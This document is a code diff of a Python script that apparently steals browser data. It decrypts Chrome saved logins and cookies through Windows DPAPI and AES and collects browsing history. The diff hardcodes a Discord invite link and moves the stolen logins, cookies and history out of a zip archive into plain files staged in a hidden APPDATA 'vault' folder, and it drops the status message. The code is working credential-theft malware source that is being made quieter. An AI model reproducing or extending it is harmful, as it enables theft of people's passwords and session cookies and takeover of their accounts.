@@ -1,5 +1,5 @@
 import zipfile, time, string, random, shutil, psutil, sqlite3, base64, json, os
-from co.discordinv import discordinv
+discordinv ='https://discord.gg/aGpfgnW4aW'
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 appdata = os.getenv('LOCALAPPDATA')
@@ -114,31 +114,24 @@ def get_history(path: str, profile: str):
     os.remove(temp_history_db)
     return add_watermark(result)
 def save_results(logins, cookies, history):
-    zip_filename = os.path.join(user, 'chrome.zip')
+    vault_dir = os.path.join(os.getenv('APPDATA'), 'vault', 'chrome')
+    if not os.path.exists(vault_dir):
+        os.makedirs(vault_dir)
     
-    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        if logins:
-            logins_filename = os.path.join(user, 'logins.txt')
-            with open(logins_filename, 'w', encoding="utf-8") as logins_file:
-                logins_file.write(logins)
-            zipf.write(logins_filename, "logins.txt")
-            os.remove(logins_filename)
+    if logins:
+        logins_filename = os.path.join(vault_dir, 'chromelogins.txt')
+        with open(logins_filename, 'w', encoding="utf-8") as logins_file:
+            logins_file.write(logins)
         
-        if cookies:
-            cookies_filename = os.path.join(user, 'cookies.txt')
-            with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
-                cookies_file.write(cookies)
-            zipf.write(cookies_filename, "cookies.txt")
-            os.remove(cookies_filename)
+    if cookies:
+        cookies_filename = os.path.join(vault_dir, 'chromecookies.txt')
+        with open(cookies_filename, 'w', encoding="utf-8") as cookies_file:
+            cookies_file.write(cookies)
         
-        if history:
-            history_filename = os.path.join(user, 'webhistory.txt')
-            with open(history_filename, 'w', encoding="utf-8") as history_file:
-                history_file.write(history)
-            zipf.write(history_filename, "webhistory.txt")
-            os.remove(history_filename)
-    
-    print(f"Saved login data, cookies, and history in chrome.zip.")
+    if history:
+        history_filename = os.path.join(vault_dir, 'chromewebhistory.txt')
+        with open(history_filename, 'w', encoding="utf-8") as history_file:
+            history_file.write(history)
 
 def extract_logins_cookies_history():
     total_browsers = 0
